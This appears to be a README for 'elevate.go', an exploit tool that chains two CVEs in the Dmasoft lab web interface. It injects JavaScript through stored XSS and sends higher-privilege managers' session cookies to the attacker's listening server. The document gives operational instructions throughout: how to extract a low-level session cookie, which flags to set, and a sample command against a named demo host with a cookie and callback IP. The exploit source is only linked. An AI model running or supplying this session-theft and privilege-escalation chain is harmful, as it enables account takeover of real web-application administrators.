---
title: Dmasoft PrivEsc Exploit
---

**Description: "Chains CVE-2021-29011 and CVE-2021-29012 together to inject Javascript and steal cookies**

The attack scenario is:

* We compromise a low-level manager account on Dmasoft lab's web interface
* We inject Javascript into an area this low-level manager account has access to
* A higher privilege manager account visits the area we injected our Javascript
* Their session cookie is sent to our website and we check their privileges

All of this is automated with elevate.go. You simply need to provide the session cookie of a low level user. It will inject the Javascript into the multiple pages that are vulnerable to XSS (and that our low level user can access), and then start a web server, waiting for someone to access any of the compromised webpages and have their session cookie sent to our web server.

Once our web server receives a session cookie, it is checked against various URIs in order to determine what the victim can access. This information is displayed to the operator of the exploit.
Usage

`elevate.go` has 3 mandatory flags:

* -s - the session cookie of the low-level manager account. You can login to your manager account and view the network requests via your browser's network monitor to obtain this. It would be under the cookie tab. Only grab the 26-character session cookie and nothing else.
* -u - the base URL of the dmasoftlab web interface
* -ip - your local IP address, this is used when creating the Javascript payload, so we know where to send stolen session cookies. Don't worry, the creation and handling of the web server is handled in elevate.go already.

An example:

    go run elevate.go -s t6l83blor6m42unvg4vh70d9v6 -ip 192.168.1.254 -u http://radmandemo.dmasoftlab.com
    go run elevate.go -s <session-cookie> -ip <local-ip-address> -u <target-url>

Example output after a session cookie is stolen:

![](https://github.com/1d8/publications/raw/main/dmasoft-exploit/imgs/img1.png)

the code for `elevate.go` can be found [here](https://github.com/1d8/publications/blob/main/dmasoft-exploit/elevate.go)
